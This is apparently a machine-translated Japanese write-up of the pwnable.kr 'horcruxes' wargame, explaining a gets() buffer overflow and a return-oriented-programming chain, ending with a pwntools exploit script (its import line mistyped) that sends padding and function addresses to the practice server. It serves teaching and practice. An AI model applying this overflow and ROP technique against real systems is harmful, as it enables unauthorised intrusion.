horcruxesクエストの解決策


すべてがこの記事で非常に詳細 に説明されているため、リバース指向プログラミングとは何かを説明する理由はわかりません。

horcruxes署名アイコンをクリックすると、SSHを介してパスワードguestで接続する必要があることが通知されます。



接続すると、対応するバナーが表示されます。



サーバー上にあるファイルと、私たちが持っている権利を調べてみましょう。



READMEファイルがあります。私たちに残されたメッセージを見てみましょう。



プログラムはポート9032で実行されると報告されています。ソースコードは提供されていないため、プログラムを自分でダウンロードしてください。
scp -P2222 horcruxes@pwnable.kr:horcruxes /root/



IDAで実行して逆コンパイルします。 3つの興味深い関数があります：hint、init_ABCDEFG、およびropme。



名前から判断すると、ヒント関数にはヒントが含まれている必要があります。彼女に会いましょう。



あなたは7つのレベルを通過する必要があると言われています。さて、ropmeを見てみましょう。



もうもっと面白い。プログラムは数値を読み取り、それが特定の参照値と等しい場合、この値を表示する関数が呼び出されます。したがって、7つの意味があります。



一致しない場合、変数sumと比較する文字列を入力するよう求められます。それでは、init_ABCDEFGを見てみましょう。



ここでは、ランダムに生成される参照値の初期化が発生します。合計は、これらの数値の合計です。

プログラムを整理しました。クエストのツールチップにはROPと書かれています。考え方は次のとおりです。7つの関数をすべて呼び出して参照値を確認し、次にropmeを再度呼び出してこれらの値の合計を転送する必要があります。

gets関数のおかげで、戻りアドレスを一連のアドレスに書き換えることができます。戻りアドレスまでのバイト数を計算します。



したがって、プログラムを転送する必要があり、スタブの0x78バイトを転送してから、関数の8行のアドレスを転送する必要があります。IDAでは、関数のアドレスを検索します。



今度はエクスプロイトを記述しましょう。
rom pwn import *

payload = "A" * 0x78
payload += p32(0x0809fe4b)
payload += p32(0x0809fe6a)
payload += p32(0x0809fe89)
payload += p32(0x0809fea8)
payload += p32(0x0809fec7)
payload += p32(0x0809fee6)
payload += p32(0x0809ff05)
payload += p32(0x0809fffc)

con = remote("pwnable.kr", 9032)

con.recv()
con.recv()

con.send("123" + "\n")

con.recv()

con.send(payload + "\n")

con.recv()
ans = con.recv().split('\n')

sum_result = 0
for i in range(1,8):
	sum_result += int(ans[i].split('+')[1].split(')')[0])

con.send("123" + "\n")
con.send(str(sum_result) + "\n")
